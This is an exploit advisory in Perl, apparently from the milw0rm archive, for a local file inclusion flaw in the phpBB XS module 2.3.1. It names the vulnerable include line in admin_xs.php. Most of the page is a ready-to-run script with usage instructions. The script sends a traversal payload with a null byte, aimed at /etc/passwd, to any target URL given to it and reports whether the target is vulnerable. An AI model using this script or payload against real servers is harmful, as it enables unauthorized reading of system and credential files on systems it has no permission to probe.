<html><head><title>phpBB Module XS-Mod 2.3.1 Local File Inclusion Vulnerability</title></head><pre>          ..%%%%....%%%%...%%..%%...........%%%%...%%%%%...%%%%%%..%%...%%.
          .%%......%%..%%..%%..%%..........%%..%%..%%..%%..%%......%%...%%.
          ..%%%%...%%..%%..%%%%%%..%%%%%%..%%......%%%%%...%%%%....%%.%.%%.
          .....%%..%%..%%..%%..%%..........%%..%%..%%..%%..%%......%%%%%%%.
          ..%%%%....%%%%...%%..%%...........%%%%...%%..%%..%%%%%%...%%.%%..
          .................................................................

[+] Software: phpBB Module XS 2.3.1
[+] Vendor: http://www.phpbbmods.de
[+] Download: http://www.phpbbmods.de/downloads.php?view=detail&amp;id=3

[~] Vulnerability found by: bd0rk
[~] Contact: bd0rk[at]hackermail.com
[~] Website: http://www.soh-crew.it.tt
[~] Greetings: str0ke, TheJT, maria

[+] Vulnerable Code in /admin/admin_xs.php line 33
[+] Code: include_once('xs_include.' . $phpEx);
[+] It is a local file inclusion

[+]Exploitcode:

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

print &quot;\t\t+++++++++++++++++++++++++++++++++++++++++++++++++++\n\n&quot;;
print &quot;\t\t+                                                 +\n\n&quot;;
print &quot;\t\t+ phpBB Module XS 2.3.1 Local File Inclusion Expl +\n\n&quot;;
print &quot;\t\t+                                                 +\n\n&quot;;
print &quot;\t\t+++++++++++++++++++++++++++++++++++++++++++++++++++\n\n&quot;;

if (!$ARGV[0])
{
print &quot;Usage: expl.pl [target]\n&quot;;
print &quot;Example: expl.pl http://127.0.0.1/directory/admin/\n&quot;;
}

else
{
$web=$ARGV[0];
chomp $web;

$file=&quot;admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/passwd%00&quot;;

my $web1=$web.$file;
print &quot;$web1\n\n&quot;;
my $agent = LWP::UserAgent-&gt;new;
my $req=HTTP::Request-&gt;new(GET=&gt;$web1);
$doc = $agent-&gt;request($req)-&gt;as_string;

if ($doc=~ /^root/moxis ){
print &quot;This is vulnerable\n&quot;;
}
else
{
print &quot;It is not vulnerable\n&quot;;
}
}

# milw0rm.com [2008-03-24]</pre></html>